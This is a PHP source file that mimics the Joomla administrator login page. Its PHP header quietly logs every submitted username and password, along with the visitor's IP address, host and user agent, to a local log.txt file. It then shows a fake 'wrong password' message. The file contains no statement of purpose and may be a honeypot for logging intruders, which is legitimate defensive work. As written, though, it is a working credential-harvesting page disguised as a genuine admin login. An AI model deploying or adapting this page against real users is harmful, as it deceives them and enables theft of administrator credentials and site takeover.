<?php
/**
 * @author: Golovkin Vladimir <rustyj4ck@gmail.com>
 */

$isPost = false;

if (!empty($_POST)) {

    $isPost = true;

    $file = __DIR__ . '/log.txt';
    $content = PHP_EOL;
    $content .= $_SERVER['REMOTE_ADDR'];
    $content .= ' : ';
    $content .= date('d.m.Y H:i');
    $content .= ' : ';
    $content .= $_SERVER['HTTP_HOST'];
    $content .= ' : ';
    $content .= $_SERVER['HTTP_USER_AGENT'];
    $content .= PHP_EOL;
    $content .= json_encode($_POST, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE);
    if (!empty($_POST['username']))
    file_put_contents($file, $content, FILE_APPEND);
}

?>


<!DOCTYPE html>
<html xmlns:fb="http://ogp.me/ns/fb#"  xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb" lang="en-gb" dir="ltr" >
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta name="generator" content="Joomla! - Open Source Content Management" />
    <title>Joomla - Administration</title>

    <link rel="stylesheet" href="index.css" type="text/css" />

</head>

<body class="site com_login view-login layout-default task- itemid- <?php if ($isPost): ?>background<?php endif ?>">
<div <?php if ($isPost): ?>class="background"<?php endif ?>>
<!-- Container -->
<div class="container">
    <div id="content">
        <!-- Begin Content -->
        <div id="element-box" class="login well">
            <img src="http://joomla35.ijoomlademo.com/administrator/templates/isis/images/joomla.png" alt="iJoomla Demo" />
            <hr />
            <div id="system-message-container">
            </div>

<?php if ($isPost): ?>

    Неверный пароль!
    <br/>
    <br/>

<?php endif ?>



            <form action="/administrator/index.php" method="post" id="form-login" class="form-inline">
                <fieldset class="loginform">
                    <div class="control-group">
                        <div class="controls">
                            <div class="input-prepend input-append">
					<span class="add-on">
						<span class="icon-user hasTooltip" title="Username"></span>
						<label for="mod-login-username" class="element-invisible">
                            Username						</label>
					</span>
                                <input name="username" tabindex="1" id="mod-login-username" type="text" class="input-medium" placeholder="Username" size="15" autofocus="true" value="" />
                                <a href="" class="btn width-auto hasTooltip" title="Forgot your username?">
                                    <span class="icon-help"></span>
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="control-group">
                        <div class="controls">
                            <div class="input-prepend input-append">
					<span class="add-on">
						<span class="icon-lock hasTooltip" title="Password"></span>
						<label for="mod-login-password" class="element-invisible">
                            Password						</label>
					</span>
                                <input name="passwd" tabindex="2" id="mod-login-password" type="password" class="input-medium" placeholder="Password" size="15" value="" />
                                <a href="" class="btn width-auto hasTooltip" title="Forgot your password?">
                                    <span class="icon-help"></span>
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="control-group">
                        <div class="controls">
                            <div class="btn-group">
                                <button tabindex="3" class="btn btn-primary btn-block btn-large">
                                    <span class="icon-lock icon-white"></span> Log in					</button>
                            </div>
                        </div>
                    </div>
            	</fieldset>
            </form>


        </div>
        <noscript>
            Warning! JavaScript must be enabled for proper operation of the Administrator Backend.			</noscript>
        <!-- End Content -->
    </div>
</div>
<div class="navbar navbar-fixed-bottom hidden-phone">
    <p class="pull-right">
        &copy; 2015 Joomla	</p>

    <a href="mailto:support@<?=$_SERVER['HTTP_HOST']?>" class="pull-left btn btn-info btn-small" style="margin-top:-5px;">Contact administrator</a>
</div>

</div>
</body>
</html>

